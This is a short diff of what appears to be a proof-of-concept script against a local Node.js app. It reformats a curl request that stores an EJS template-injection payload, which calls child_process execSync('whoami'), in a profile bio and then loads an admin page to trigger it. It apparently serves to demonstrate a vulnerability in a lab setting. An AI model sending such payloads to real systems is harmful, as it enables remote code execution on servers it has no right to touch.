@@ -57,9 +57,7 @@ curl -s -X POST -H "Content-Type: application/json" ^
 	http://localhost:3000/update-profile
 
 # 2. Set bio to EJS payload (Windows prints whoami)
-curl -s -X POST -H "Content-Type: application/json" ^
-	-d "{\"bio\":\"<%= require('child_process').execSync('whoami').toString() %>\"}" ^
-	http://localhost:3000/update-profile
+curl -s -X POST -H "Content-Type: application/json" 	-d "{\"bio\":\"<%= require('child_process').execSync('whoami').toString() %>\"}" 	http://localhost:3000/update-profile
 
 # 3. Trigger vulnerable admin render
 curl -s http://localhost:3000/admin
